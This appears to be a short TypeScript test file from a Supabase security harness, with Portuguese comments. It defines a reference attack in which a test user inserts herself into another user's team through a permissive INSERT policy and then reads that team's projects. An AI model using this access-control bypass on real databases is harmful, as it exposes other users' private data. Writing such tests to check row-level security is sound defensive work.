import { definirAtaque } from '../../cliente/supabase'

// Ataque de referência: a política de INSERT em membros aceita qualquer pessoa que se
// inscreva com o próprio id. A Alice entra no time do Bruno e lê os projetos dele.
export default definirAtaque(async (supabase) => {
  const { data } = await supabase.auth.signInWithPassword({ email: 'alice@exemplo.com', password: 'paodequeijo' })
  const eu = (data as { user: { id: string } }).user.id
  await supabase.from('membros').insert({ id: 90, time_id: 2, user_id: eu })
  await supabase.from('projetos').select()
})
